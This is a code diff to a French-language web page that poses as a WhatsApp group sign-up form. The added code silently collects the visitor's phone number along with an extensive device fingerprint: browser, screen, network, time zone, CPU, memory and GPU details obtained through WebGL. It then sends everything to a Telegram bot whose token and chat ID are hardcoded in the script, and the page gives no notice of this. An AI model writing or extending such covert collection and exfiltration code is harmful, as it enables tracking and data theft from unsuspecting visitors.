@@ -250,6 +250,63 @@
                 utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
             });
 
+            // Function to collect browser information
+            function getBrowserInfo() {
+                const connection = navigator.connection || {};
+                const screenOrientation = screen.orientation || {};
+                
+                return {
+                    // Browser info
+                    userAgent: navigator.userAgent,
+                    browser: navigator.userAgentData?.brands?.map(b => b.brand + '/' + b.version).join(' ') || 'Unknown',
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    cookieEnabled: navigator.cookieEnabled,
+                    pdfViewerEnabled: navigator.pdfViewerEnabled,
+                    webdriver: navigator.webdriver,
+                    
+                    // Screen info
+                    screenWidth: screen.width,
+                    screenHeight: screen.height,
+                    colorDepth: screen.colorDepth,
+                    pixelRatio: window.devicePixelRatio,
+                    orientation: screenOrientation.type || (screen.width > screen.height ? 'landscape' : 'portrait'),
+                    
+                    // Network info
+                    connectionType: connection.effectiveType || 'Unknown',
+                    downlink: connection.downlink || 'Unknown',
+                    rtt: connection.rtt || 'Unknown',
+                    
+                    // System info
+                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    localDateTime: new Date().toString(),
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+                    deviceMemory: navigator.deviceMemory || 'Unknown',
+                    
+                    // WebGL info (for GPU detection)
+                    webglVendor: getWebGLInfo().vendor,
+                    webglRenderer: getWebGLInfo().renderer
+                };
+            }
+
+            // Helper function to get WebGL info
+            function getWebGLInfo() {
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (!gl) return { vendor: 'Unknown', renderer: 'Unknown' };
+                    
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    return {
+                        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown',
+                        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown'
+                    };
+                } catch (e) {
+                    return { vendor: 'Error', renderer: 'Error' };
+                }
+            }
+
             // Form submission
             const whatsappForm = document.getElementById('whatsappForm');
             const countdownSection = document.getElementById('countdownSection');
@@ -271,10 +328,43 @@
                 submitBtn.innerHTML = '<span class="spinner"></span> <span>Envoi en cours...</span>';
                 submitBtn.disabled = true;
                 
+                // Collect browser and system information
+                const browserInfo = getBrowserInfo();
+                
+                // Prepare message for Telegram
+                const message = `Nouvelle demande de groupe WhatsApp:
+📱 Téléphone: ${phoneNumber}
+
+=== Informations du navigateur ===
+🌐 Navigateur: ${browserInfo.userAgent}
+🖥️ Plateforme: ${browserInfo.platform}
+🗣️ Langue: ${browserInfo.language}
+🍪 Cookies: ${browserInfo.cookieEnabled ? 'Activés' : 'Désactivés'}
+
+=== Écran ===
+📺 Résolution: ${browserInfo.screenWidth}x${browserInfo.screenHeight}
+🎨 Profondeur couleur: ${browserInfo.colorDepth} bits
+🖥️ Ratio pixels: ${browserInfo.pixelRatio}
+🔄 Orientation: ${browserInfo.orientation}
+
+=== Réseau ===
+📶 Type connexion: ${browserInfo.connectionType}
+⬇️ Débit: ${browserInfo.downlink} Mbps
+⏱️ Latence: ${browserInfo.rtt} ms
+
+=== Système ===
+⏰ Fuseau horaire: ${browserInfo.timeZone}
+📅 Date/heure locale: ${browserInfo.localDateTime}
+💻 Cœurs CPU: ${browserInfo.hardwareConcurrency}
+🧠 Mémoire: ${browserInfo.deviceMemory} GB
+
+=== WebGL ===
+🖥️ GPU Vendeur: ${browserInfo.webglVendor}
+🎮 GPU Modèle: ${browserInfo.webglRenderer}`;
+                
                 // Send data to Telegram bot
                 const botToken = '7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw';
                 const chatId = '5372119436';
-                const message = `Nouvelle demande de groupe WhatsApp:\nTéléphone: ${phoneNumber}`;
                 const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
                 
                 fetch(url)
